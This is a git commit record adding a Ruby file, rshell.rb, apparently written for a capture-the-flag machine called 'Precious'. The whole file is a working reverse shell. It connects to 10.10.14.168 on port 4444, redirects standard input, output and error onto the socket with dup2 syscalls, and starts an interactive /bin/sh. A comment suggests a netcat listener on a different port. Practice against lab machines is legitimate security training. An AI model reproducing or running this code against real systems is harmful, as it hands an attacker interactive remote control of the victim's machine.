ef315c05e0d56bb439dff2f3c270e2646fa5b7ba
stdmedoth_kali <jovictor210@gmail.com>
2023-01-07 03:28:27 -0300

    added Precious machine

---
+++ Precious/pasta_teste/rshell.rb
@@ -0,0 +1,12 @@
+#!/usr/bin/env ruby
+# syscall 33 = dup2 on 64-bit Linux
+# syscall 63 = dup2 on 32-bit Linux
+# test with nc -lvp 1337 
+
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 4444, '10.10.14.168'
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
